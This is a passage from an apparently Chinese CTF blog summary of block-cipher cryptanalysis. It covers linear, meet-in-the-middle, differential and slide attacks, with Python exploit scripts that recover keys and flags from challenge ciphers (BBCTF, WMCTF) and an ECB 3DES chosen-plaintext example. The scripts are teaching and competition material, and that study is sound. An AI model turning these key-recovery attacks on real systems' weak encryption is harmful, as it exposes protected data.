i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            res.append(int(<span class="string">''</span>.join([x[i] <span class="keyword">for</span> x <span class="keyword">in</span> bits]), <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bitxor</span><span class="params">(n, mask)</span>:</span></span><br><span class="line">    bitlist = [int(x) <span class="keyword">for</span> x <span class="keyword">in</span> bin(n &amp; mask)[<span class="number">2</span>:]]</span><br><span class="line">    <span class="keyword">return</span> bitlist.count(<span class="number">1</span>) % <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sbox线性估计</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">linearSbox</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> linearInput</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        si = sbox[i]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">                a = bitxor(i, j) <span class="comment"># 线性估计输入</span></span><br><span class="line">                b = bitxor(si, k) <span class="comment"># 线性估计输出 </span></span><br><span class="line">                <span class="keyword">if</span> a == b:</span><br><span class="line">                    offset[j][k] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        offset[i] = [abs(x - <span class="number">128</span>) / <span class="number">256</span> <span class="keyword">for</span> x <span class="keyword">in</span> offset[i]]</span><br><span class="line">    <span class="keyword">for</span> linearOutput <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        cur = [x[linearOutput] <span class="keyword">for</span> x <span class="keyword">in</span> offset]</span><br><span class="line">        linearInput.append(cur.index(max(cur)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcOffset</span><span class="params">(pt, ct, j, guessed_key)</span>:</span>  <span class="comment"># 猜测第j段子密钥</span></span><br><span class="line">    pt = list(unhexlify(pt))</span><br><span class="line">    ct = list(unhexlify(ct))</span><br><span class="line">    ct[j] ^= guessed_key</span><br><span class="line">    ct[j] = sbox[ct[j]] <span class="comment"># sbox即为sboxi的逆</span></span><br><span class="line">    ct[j] = (ct[j] * coef[j]) % <span class="number">256</span></span><br><span class="line">    u1 = bitxor(pt[<span class="number">0</span>], linearInput[<span class="number">1</span> &lt;&lt; ((<span class="number">6</span> - j) % <span class="number">8</span>)])</span><br><span class="line">    u2 = bitxor(ct[j], <span class="number">0b10000000</span>)</span><br><span class="line">    <span class="keyword">if</span> u1 == u2:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">linearAttack</span><span class="params">()</span>:</span></span><br><span class="line">    key2 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>): <span class="comment"># 第二轮子密钥的第i段</span></span><br><span class="line">        count = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">        <span class="keyword">for</span> guessed_key <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            print(<span class="string">"[+] Cracking key...(&#123;&#125;-&#123;&#125;)"</span>.format(i, guessed_key))</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">                <span class="keyword">if</span> calcOffset(plain[j], cipher[j], i, guessed_key) == <span class="literal">True</span>:</span><br><span class="line">                    count[guessed_key] += <span class="number">1</span></span><br><span class="line">        bias = [abs(x - <span class="number">5000</span>) / <span class="number">10000</span> <span class="keyword">for</span> x <span class="keyword">in</span> count]</span><br><span class="line">        key2.append(bias.index(max(bias)))</span><br><span class="line">    <span class="keyword">return</span> key2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getkey</span><span class="params">(key2)</span>:</span></span><br><span class="line">    ct = list(unhexlify(cipher[<span class="number">0</span>]))</span><br><span class="line">    pt = list(unhexlify(plain[<span class="number">0</span>]))</span><br><span class="line">    cur = doxor(ct, key2)</span><br><span class="line">    cur = [sbox[x] <span class="keyword">for</span> x <span class="keyword">in</span> cur]</span><br><span class="line">    cur = trans(cur)</span><br><span class="line">    cur = [sboxi[x] <span class="keyword">for</span> x <span class="keyword">in</span> cur]</span><br><span class="line">    key = doxor(cur, pt) + key2</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_block</span><span class="params">(ct, key)</span>:</span></span><br><span class="line">    cur = doxor(ct, key[SZ:])</span><br><span class="line">    cur = [sbox[x] <span class="keyword">for</span> x <span class="keyword">in</span> cur]</span><br><span class="line">    cur = trans(cur)</span><br><span class="line">    cur = [sboxi[x] <span class="keyword">for</span> x <span class="keyword">in</span> cur]</span><br><span class="line">    cur = doxor(cur, key[:SZ])</span><br><span class="line">    <span class="keyword">return</span> cur</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(ct, key)</span>:</span></span><br><span class="line">    pt = <span class="string">b''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(ct), SZ * <span class="number">2</span>):</span><br><span class="line">        block_ct = list(unhexlify(ct[i : i + SZ * <span class="number">2</span>]))</span><br><span class="line">        block_pt = decrypt_block(block_ct, key)</span><br><span class="line">        pt += bytes(block_pt)</span><br><span class="line">    <span class="keyword">return</span> pt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    getData(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    linearSbox()</span><br><span class="line">    key2 = linearAttack()</span><br><span class="line">    key = getkey(key2)</span><br><span class="line">    print(key)</span><br><span class="line">    flag = decrypt(enc_flag, key)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><h4 id="more">More</h4><p>在轮次高的时候，线性分析的分析复杂度往往会更高，而且成功率有所降低，具体视题目而定</p><h3 id="中间相遇攻击">中间相遇攻击</h3><h4 id="theorem-1">Theorem</h4><p>以下基本原理参照ctf-wiki</p><p>假设 E 和 D 分别是加密函数和解密函数，<span class="math inline">\(k_{1}\)</span> 和 <span class="math inline">\(k_2\)</span> 分别是两次加密使用的密钥，则我们有 <span class="math display">\[C=E_{k_2}(E_{k_1}(P))\\P=D_{k_2}(D_{k_1}(C))\]</span> 暴力枚举<span class="math inline">\((k_{1},k_{2})\)</span>的组合对应时间复杂度为<span class="math inline">\(O(N^{2})\)</span>，而基于<span class="math inline">\(E_{k_1}(P)=D_{k_2}(C)\)</span>这一事实</p><p>我们可以将<span class="math inline">\(E_{k_1}(P)\)</span>和<span class="math inline">\(D_{k_2}(C)\)</span>制成两张容量均为N的映射表，取交集即可获得中间态，进而恢复出两轮密钥</p><p>最好不要在求解第二张映射表的同时查表（这会使得查找耗费的时间大大增加），以两张完整表取交集即可</p><p>2020-BBCTF的经典例子:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">key1 = <span class="string">'0'</span>*<span class="number">13</span> + <span class="string">''</span>.join([random.choice(printable) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)])</span><br><span class="line">key2 = <span class="string">''</span>.join([random.choice(printable) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)]) + <span class="string">'0'</span>*<span class="number">13</span></span><br><span class="line"></span><br><span class="line">cipher1 = AES.new(key=key1, mode=AES.MODE_ECB)</span><br><span class="line">cipher2 = AES.new(key=key2, mode=AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nGive me a string:"</span></span><br><span class="line">pt = raw_input()</span><br><span class="line"></span><br><span class="line">val = len(pt) % <span class="number">16</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> val == <span class="number">0</span>:</span><br><span class="line">    pt += <span class="string">'0'</span>*(<span class="number">16</span> - val)</span><br><span class="line"></span><br><span class="line">c1 = cipher1.encrypt(pt.encode(<span class="string">'hex'</span>))</span><br><span class="line">c2 = cipher2.encrypt(c1.encode(<span class="string">'hex'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Encrypted string:\n'</span> + c2.encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"flag.txt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read().strip()</span><br><span class="line"><span class="comment"># length of flag is a multiple of 16</span></span><br><span class="line">ct1 = cipher1.encrypt(flag.encode(<span class="string">'hex'</span>))</span><br><span class="line">ct2 = cipher2.encrypt(ct1.encode(<span class="string">'hex'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'\nEncrypted Flag:\n'</span> + ct2.encode(<span class="string">'hex'</span>) + <span class="string">'\n'</span></span><br></pre></td></tr></table></figure><p>采用中间相遇攻击即可将时间复杂度控制在<span class="math inline">\(O(2\cdot 100^{3})\)</span>下</p><h4 id="exp-1">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In[27]:</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">import</span> itertools, string</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[37]:</span></span><br><span class="line">crack_range = list(itertools.product(string.printable, string.printable, string.printable))</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[50]:</span></span><br><span class="line">pt = hexlify(<span class="string">b'aaaaaaaaaaaaaaaa'</span>)</span><br><span class="line">key_known = <span class="string">'0'</span> * <span class="number">13</span></span><br><span class="line">c1 = []</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> suffix <span class="keyword">in</span> crack_range:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cnt % <span class="number">100</span>:</span><br><span class="line">        print(<span class="string">"\r&#123;&#125;/1000000"</span>.format(cnt), end=<span class="string">""</span>)</span><br><span class="line">    key1 = (key_known + (<span class="string">''</span>.join(suffix))).encode()</span><br><span class="line">    cipher1 = AES.new(key1, AES.MODE_ECB)</span><br><span class="line">    c1.append(cipher1.encrypt(pt))</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># In[51]</span></span><br><span class="line">c1 = [hexlify(c) <span class="keyword">for</span> c <span class="keyword">in</span> c1]</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[54]</span></span><br><span class="line">c1_set = set(c1)</span><br><span class="line">c2 = unhexlify(<span class="string">b'ef92fab38516aa95fdc53c2eb7e8fe1d5e12288fdc9d026e30469f38ca87c305ef92fab38516aa95fdc53c2eb7e8fe1d5e12288fdc9d026e30469f38ca87c305'</span>)</span><br><span class="line">inv_c1 = []</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> prefix <span class="keyword">in</span> crack_range:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cnt % <span class="number">100</span>:</span><br><span class="line">        print(<span class="string">"\r&#123;&#125;/1000000"</span>.format(cnt), end=<span class="string">""</span>)</span><br><span class="line">    key2 = ((<span class="string">''</span>.join(prefix)) + key_known).encode()</span><br><span class="line">    cipher2 = AES.new(key2, AES.MODE_ECB)</span><br><span class="line">    inv_c1.append(cipher2.decrypt(c2))</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># In[78]</span></span><br><span class="line">inv_c1_set = set(inv_c1)</span><br><span class="line">mid_cipher = list(c1_set &amp; inv_c1_set)[<span class="number">0</span>]</span><br><span class="line">key1_pos = c1.index(mid_cipher)</span><br><span class="line">key2_pos = inv_c1.index(mid_cipher)</span><br><span class="line">key1 = (key_known + (<span class="string">''</span>.join(crack_range[key1_pos]))).encode()</span><br><span class="line">key2 = ((<span class="string">''</span>.join(crack_range[key2_pos])) + key_known).encode()</span><br><span class="line">cipher1 = AES.new(key1, AES.MODE_ECB)</span><br><span class="line">cipher2 = AES.new(key2, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[78]</span></span><br><span class="line">cipher = unhexlify(<span class="string">b'fa364f11360cef2550bd9426948af22919f8bdf4903ee561ba3d9b9c7daba4e759268b5b5b4ea2589af3cf4abe6f9ae7e33c84e73a9c1630a25752ad2a984abfbbfaca24f7c0b4313e87e396f2bf5ae56ee99bb03c2ffdf67072e1dc98f9ef691db700d73f85f57ebd84f5c1711a28d1a50787d6e1b5e726bc50db5a3694f576'</span>)</span><br><span class="line">flag = unhexlify(cipher1.decrypt(unhexlify(cipher2.decrypt(cipher))))</span><br><span class="line">flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># Out[79]</span></span><br><span class="line"><span class="string">b'flag&#123;y0u_m@d3_i7_t0_7h3_m1dddl3&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="差分分析">差分分析</h3><h4 id="theorem-0">Theorem-0</h4><p>差分分析基本思想：选择大量的候选明文差分对，对应密文差分的影响来恢复尽可能多的密钥. 差分<span class="math inline">\(\Delta X_{i}=X_{i}\oplus X_{i}^{*}\)</span>.</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-07-09_14-30-05.png"></p><p>差分分析符号定义如下： <span class="math display">\[(\Delta X_{i},\Delta Y_{i}):=Prob\{F_{i}(X_{i}\oplus\Delta X_{i},K_{i})=F_{i}(X_{i},K_{i})\oplus\Delta Y_{i}\}\\[p_{1},p_{2},...p_{t}]=\prod_{i=1}^{t}p_{i}\\B_{n}:=max_{\Delta X_{i}=\Delta X_{i-2}\oplus\Delta Y_{i-1}(3\leq i\leq n)}[(\Delta X_{1},\Delta Y_{1}),(\Delta X_{2},\Delta Y_{2}),...,(\Delta X_{n},\Delta Y_{n})]\]</span></p><h4 id="theorem-1-1">Theorem-1</h4><p>下介绍如何高效搜索Feistel-SP结构分组密码的多轮高概率差分路径.</p><p>Matsui的原算法如下：</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-07-09_15-55-25.png"></p><blockquote><p>Matsui’s algorithm works by induction on the number of rounds and derives the best <em>n</em>-round weight <em>B_n</em> from the knowledge of all <em>i</em>-round best weight <em>B_i</em> (1 <em>≤</em> <em>i</em> <em>≤</em> <em>n-1</em>).</p></blockquote><p>且原始的递归深搜算法复杂度相对高，因此在其基础上进行剪枝.</p><ul><li><p><strong>重构S盒差分分布表，将其转化为密集型哈希表</strong>。python用字典实现即可(输入差分→输出差分→概率)</p></li><li><p><strong>基于向量剪枝的优化Matsui算法</strong></p><p>在基于字节剪枝的Matsui算法中，频繁的穷尽搜索<span class="math inline">\(2^{32}\)</span>或<span class="math inline">\(2^{64}\)</span>，因此使用向量递归调用，尽可能早的过滤不满足的<span class="math inline">\(\Delta X_{i}\)</span>和<span class="math inline">\(\Delta Y_{i}\)</span>.</p><p>以下是对Round-2的算法剪枝，后续轮也可采用相似算法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Call Procedure Round-2-1</span><br><span class="line">Return to the upper procedure.</span><br></pre></td></tr></table></figure><p><strong>Procedure Round-2-j (1 &lt;= j &lt;= 8):</strong></p><p>For each candidate for <span class="math inline">\(\Delta X_{2}^{j}\)</span> and <span class="math inline">\(\Delta Y_{2}^{j}\)</span>,do:</p><ul><li><p><span class="math inline">\(\quad p_{2}^{j} = (\Delta X_{2}^{j}, \Delta Y_{2}^{j})\)</span> and <span class="math inline">\(p_{2} = [p_{2}^{1}, ..., p_{2}^{j}]\)</span>;</p></li><li><p><span class="math inline">\(\quad if\ [p_{1}, p_{2}, B_{n-2}]&lt; \bar{B_{n}}\)</span>, then <strong>continue</strong>;</p></li><li><p><span class="math inline">\(\quad if\ [p_{1}, p_{2}, B_{n-2}]\geq \bar {B_{n}}\)</span>:</p><p>​ if <span class="math inline">\(j\neq 8\)</span>, then call <strong>Procedure Round-2-(j+1)</strong>;</p><p>​ else call <strong>Procedure Round-3</strong>;</p></li></ul></li></ul><h4 id="theorem-2">Theorem-2</h4><p>差分过程可以简单归纳为</p><ol type="1"><li><p>采样：选择大量合适的明文对(满足差分)，并获得相应的密文对；</p></li><li><p>去噪，通过观察密文对差分的一些特性，提早过滤一部分不正确的明文对，排除干扰；</p></li><li><p>提取信息，对过滤后的数据和每个猜测密钥进行统计分析，恢复正确轮密钥(部分比特)；</p></li></ol><p>m: 样本量大小; p: 差分区分器概率; <span class="math inline">\(\upsilon\)</span>: 平均每个密文对蕴含的密钥数;</p><p>l: 攻击所猜测的密钥量; <span class="math inline">\(\lambda\)</span>: 去噪阶段的过滤系数</p><p><strong>注</strong>：其中<span class="math inline">\(\upsilon\)</span>与S盒差分分布表有关，大致估计方法可以为：</p><p>(e.g.) S盒6进4出，平均意义上差分分布表的取值为<span class="math inline">\(2^{6}/2^{4}=4\)</span>. 假设一次攻击猜测4个S盒对应的密钥，则该参数可估计为<span class="math inline">\(4^{4}=2^{8}\)</span>.</p><p>则正确密钥至少被统计了<span class="math inline">\(mp\)</span>次，所有猜测密钥平均被统计了<span class="math inline">\(\frac{m\lambda\upsilon}{2^{l}}\)</span>次，则信噪比 <span class="math display">\[S/N=\frac{mp}{m\lambda\upsilon/2^{l}}=\frac{p\cdot 2^{l}}{\lambda\upsilon}.\]</span> 信噪比越大，即正确密钥被统计次数相对越多，更容易在计数器中被区分，从而降低选择明文攻击的明文量</p><p><span class="math inline">\(m\approx \frac{c}{p},c=constant\)</span>. 以Shamir提出的DES相关实验数据为例：</p><p><span class="math inline">\(S/N\in [1,2]\)</span>，c取值<span class="math inline">\([20,40]\)</span>；<span class="math inline">\(S/N\)</span>更大时，c取值<span class="math inline">\([3,4]\)</span>.</p><h4 id="theorem-3">Theorem-3</h4><p>对n轮Feistel的差分攻击，一般性上往往是1-R攻击，至于m-R攻击（如对八轮DES的3-R差分攻击），尽管差分特征概率会有所降低，但往往需要根据具体S盒P盒进行更特殊的构造，而非直接利用搜索到的n-1轮高概率差分特征进行攻击。</p><p>且对于<strong>非双射</strong>关系的S盒（如DES六进四出的S盒），即可能存在两轮迭代差分特征，如下图所示：</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/QQ图片20200726134141.jpg"></p><p>因为该类的S盒存在输入差分不为0，但输出差分为0的情况，在Pro(in, 0)较大时，我们就能利用二轮迭代差分特征实现2n+1(n&gt;=1)轮Feistel的1-R攻击（完全依赖于S盒特性及相邻S盒间关系）</p><p>搜索仅sbox[i]~sbox[j]激活的二轮迭代差分特征可采用以下递归算法实现（以下算法基于DES的E函数（F函数第一步）扩展）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2-round iterative differential feature (sbox[i]~sbox[j])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_path</span><span class="params">(pre, i, j)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> dif_dist</span><br><span class="line">    sub_pro = <span class="number">1</span></span><br><span class="line">    max_pro = sub_pro</span><br><span class="line">    cur_path, path = <span class="literal">None</span>, []</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> dif_dist[i].keys():</span><br><span class="line">        <span class="keyword">if</span> key[<span class="number">1</span>] == <span class="number">0</span> <span class="keyword">and</span> ((key[<span class="number">0</span>] &amp; <span class="number">0b110000</span>) &gt;&gt; <span class="number">4</span>) == (pre &amp; <span class="number">0b000011</span>):</span><br><span class="line">            <span class="keyword">if</span> i == j <span class="keyword">and</span> (key[<span class="number">0</span>] &amp; <span class="number">0b000011</span>) != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            value = dif_dist[i][key]</span><br><span class="line">            <span class="keyword">if</span> value % <span class="number">64</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> i &lt; j:</span><br><span class="line">                path, sub_pro = find_path(key[<span class="number">0</span>], i + <span class="number">1</span>, j)</span><br><span class="line">            <span class="keyword">if</span> value * sub_pro &gt; max_pro:</span><br><span class="line">                max_pro = value * sub_pro</span><br><span class="line">                cur_path = [key[<span class="number">0</span>]] + path</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cur_path:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> cur_path, max_pro <span class="comment"># pro = max_pro / (64 ** (j - i + 1))</span></span><br></pre></td></tr></table></figure><h4 id="exp-2">exp</h4><p>以WMCTF出的idiot box为例，我的本意是S盒随机shuffle生成，key不变，动态请求靶机直至找到使高概率二轮迭代差分特征存在的S盒，但阿里云频繁remote真的慢慢慢慢慢慢，还会被banip</p><p>version1的exp是一次攻击两个相邻S盒，分四段得到第六轮的子密钥，但是因为上述原因改了- -</p><p>改成静态S盒后，又有一样的问题，拿差分攻击要的明密文对本地秒出，但是docker挂载阿里云以后发现取<span class="math inline">\(2^{12}\)</span>个明文对都要三分钟- -NM$L</p><p>于是version1的exp因为每段要取<span class="math inline">\(2^{14}\)</span>个明文对，分四段（<span class="math inline">\(2^{16}\)</span>对），改成了version2每段取<span class="math inline">\(2^{12}\)</span>个明文对，分八段（<span class="math inline">\(2^{15}\)</span>对）</p><p>Sbox也改成了根本就不符合S盒定义的Sbox，因为其实是不存在针对单个S盒的二轮迭代的（因为由E扩展函数知，该迭代差分特征要求输入差分为<span class="math inline">\(00x_{1}x_{2}00\)</span>（即明文对处于同行），所以不可能存在满足该差分输入的明文对同时满足差分输出为0）</p><p>歪日，👴真的吐了，version1远程exp估计要跑将近1h，相较之下version2的exp将近30min，还算能接受...吧</p><p>这里给出我version1的本地测试exp，就不放WMCTF上的版本了（这个根本称不上是S盒的Sbox一直有、膈应</p><p><a href="idiot%20box-version%201.ipynb">Click Here to Download idiot box-version 1</a></p><p>再做下exp里一些部分的解释：</p><ol type="1"><li><p>针对相邻两个S盒的find_path：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> max_pro &lt; <span class="number">192</span>: <span class="comment"># find suitable sbox</span></span><br></pre></td></tr></table></figure><p>要求max_pro &lt; 192的原因是要令S/N足够大，<span class="math inline">\(S/N\geq\frac{2^{12}(\frac{192}{64*64})^{2}}{4^{2}}\geq 0.5625\)</span>，因此可将c暂取为40，<span class="math inline">\(m=c/p\leq 40\frac{64^{4}}{192^{2}}\approx 18204\)</span>，所以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">2</span>**(<span class="number">4</span>*(right-left+<span class="number">1</span>)))):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">3</span>):</span><br><span class="line">     <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">3</span>):</span><br></pre></td></tr></table></figure><p>每次取<span class="math inline">\(2^{14}\)</span>个明文对，并同时通过密文右半部分差分过滤错误对</p></li><li><p>关于选择明文攻击时明文shift的解释：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i_shift = <span class="number">60</span> - right * <span class="number">4</span></span><br><span class="line">j_shift = (i_shift - <span class="number">3</span>) % <span class="number">32</span> + <span class="number">32</span></span><br><span class="line">k_shift = (i_shift + <span class="number">4</span> * (right - left + <span class="number">1</span>)) % <span class="number">32</span> + <span class="number">32</span></span><br></pre></td></tr></table></figure><p>选取的明文对注意一定要激活差分特征上的活跃S盒</p></li><li><p>密钥计数器得到的最后一轮候选子密钥可能存在多解，验证校验明文即可</p></li></ol><h3 id="滑动攻击">滑动攻击</h3><h4 id="theorem-4">Theorem</h4><p><a href="https://0xdktb.top/2020/09/22/%E9%87%91%E8%9E%8D%E5%AF%86%E7%A0%81%E6%9D%AF2020-%E6%8C%91%E6%88%98%E8%B5%9B/">https://0xdktb.top/2020/09/22/%E9%87%91%E8%9E%8D%E5%AF%86%E7%A0%81%E6%9D%AF2020-%E6%8C%91%E6%88%98%E8%B5%9B/</a></p><p><a href="http://theamazingking.com/crypto-slide.php" target="_blank" rel="noopener">http://theamazingking.com/crypto-slide.php</a></p><h3 id="group-modeecb">Group Mode(ECB)</h3><h4 id="theorem-5">Theorem</h4><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/ecb_encryption.png"></p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/ecb_decryption.png"></p><p>以i春秋2020公益赛NewsWebsite为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Value</span>(<span class="string">"$&#123;system.encrypt_key&#125;"</span>)</span><br><span class="line"><span class="keyword">private</span> String signKey;</span><br><span class="line"><span class="meta">@Value</span>(<span class="string">"$&#123;system.flag&#125;"</span>)</span><br><span class="line"><span class="keyword">private</span> String sign;</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">desEncrypt</span><span class="params">(String plainText)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  String cipher = <span class="string">""</span>;</span><br><span class="line">  <span class="keyword">byte</span>[] originPlainText = (plainText + System.currentTimeMillis() + <span class="keyword">this</span>.sign).getBytes();</span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    TripleDesCipher tripleDesCipher = <span class="keyword">new</span> TripleDesCipher(<span class="keyword">this</span>.signKey.getBytes());</span><br><span class="line">    cipher = Base64.getEncoder().encodeToString(tripleDesCipher.encode(originPlainText));</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>其3DES有选择明文攻击，且plainText可控，返回的密文为<span class="math 